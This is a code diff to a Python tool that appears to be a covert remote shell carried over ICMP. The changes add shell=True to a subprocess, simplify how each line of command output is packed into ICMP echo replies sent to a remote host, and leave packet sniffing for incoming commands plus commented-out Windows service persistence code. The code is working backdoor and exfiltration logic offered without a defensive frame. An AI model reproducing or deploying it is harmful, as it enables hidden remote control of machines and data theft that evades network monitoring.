@@ -27,6 +27,7 @@ p = subprocess.Popen(
     stdout=subprocess.PIPE,
     stdin=subprocess.PIPE,
     stderr=subprocess.PIPE,
+    shell=True
 )
 destination_ip = ""
 source_ip = ""
@@ -40,9 +41,9 @@ def readstdout():
         string = f'{l.decode("cp866", "backslashreplace")}'.strip()
         if string == '':
             continue
-        reply_packet = Ether(src=source_mac, dst=destination_mac) / IP(src=source_ip, dst=destination_ip) / ICMP(type=0,
-                                                                                                                 id=1515) / string
-        sendp(reply_packet, verbose=False)
+        reply_packet = IP(dst=destination_ip) / ICMP(type=0,
+                                                     id=1515) / string
+        send(reply_packet, verbose=False)
         sys.stdout.write(string + "\n")
 
 
@@ -183,7 +184,6 @@ def main():
         ishell.ish_info.packetsize = args.p
     if args.d:
         ish_debug = 0
-
     t1 = threading.Thread(target=readstdout)
     t2 = threading.Thread(target=readstderr)
 
@@ -196,9 +196,10 @@ def main():
         #    sys.exit(-1)
         sniff(filter="icmp", prn=packet_callback)
 
-        # I can now close the console or anything I want and long_run.py continues!
+    # I can now close the console or anything I want and long_run.py continues!
 
-    # sniff(filter="icmp", prn=packet_callback)
+
+# sniff(filter="icmp", prn=packet_callback)
 
 
 # class TestService(win32serviceutil.ServiceFramework):
@@ -292,8 +293,8 @@ def server():
 if __name__ == '__main__':
     main()
     # if len(sys.argv) == 1:
-    #  servicemanager.Initialize()
-    #  servicemanager.PrepareToHostSingle(Service)
-    #  servicemanager.StartServiceCtrlDispatcher()
+    #    servicemanager.Initialize()
+    #    servicemanager.PrepareToHostSingle(Service)
+    #    servicemanager.StartServiceCtrlDispatcher()
     # else:
-    #  win32serviceutil.HandleCommandLine(Service)
+    #    win32serviceutil.HandleCommandLine(Service)
